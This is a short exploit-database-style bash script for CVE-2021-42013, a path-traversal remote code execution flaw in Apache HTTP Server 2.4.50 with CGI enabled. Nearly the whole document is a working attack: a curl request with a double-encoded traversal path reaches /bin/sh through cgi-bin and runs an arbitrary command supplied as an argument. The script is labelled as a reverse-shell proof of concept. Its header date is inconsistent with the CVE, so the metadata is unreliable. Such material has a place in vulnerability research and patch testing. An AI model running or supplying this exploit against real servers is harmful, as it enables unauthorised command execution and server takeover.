# Exploit: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)
# Credits: Ash Daulton & cPanel Security Team
# Date: 24/07/2021
# Exploit Author: TheLastVvV.com
# Vendor Homepage:  https://apache.org/
# Version: Apache 2.4.50 with CGI enable
# Tested on : Debian 5.10.28
# CVE : CVE-2021-42013

#!/bin/bash

echo 'PoC CVE-2021-42013 reverse shell Apache 2.4.50 with CGI'
if [ $# -eq 0 ]
then
echo  "try: ./$0 http://ip:port"
exit 1
fi
curl "$1/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $2"
